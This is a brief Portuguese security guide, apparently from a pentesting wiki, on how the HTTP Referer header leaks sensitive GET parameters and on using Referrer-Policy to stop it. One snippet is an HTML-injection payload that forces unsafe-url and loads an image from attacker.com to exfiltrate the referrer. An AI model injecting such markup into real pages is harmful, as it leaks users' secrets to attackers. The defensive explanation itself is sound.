# HTTP Interessante

## Headers Referrer e sua política

Referrer é um tipo de header usado pelos navegadores para indicar a ultima página visitada.

### Informação sensível vazada
Se em algum ponto dentro de uma página web estiver alocado alguma informação sensível nos parametros de uma requisição GET, caso esta página contenha links para fontes externas ou que seja possível um invasor fazer ou sugerir \(engenharia social\) um usuário acessar uma URL controlada pelo mesmo. Se torna possível a extração de informação sensível que está na requisição GET.

### Mitigação
Você pode fazer que o navegador siga uma **Referrer-policy** (política para o header) que pode **evitar** que informações sensíveis sejam repassadas para outras aplicações web.

```text
Referrer-Policy: no-referrer
Referrer-Policy: no-referrer-when-downgrade
Referrer-Policy: origin
Referrer-Policy: origin-when-cross-origin
Referrer-Policy: same-origin
Referrer-Policy: strict-origin
Referrer-Policy: strict-origin-when-cross-origin
Referrer-Policy: unsafe-url
```

### Contra-Mitigação
Você pode reescrever essa regra do header através de uma meta tag no HTML \(o atacante precisa explorar uma vulnerabilidade de HTML Injection):


```markup
<meta name="referrer" content="unsafe-url">
<img src="https://attacker.com">
```

### Defesa
Nunca coloque quaisquer informações sensíveis dentro de parâmetros ou caminhos na URL de uma requisição GET 
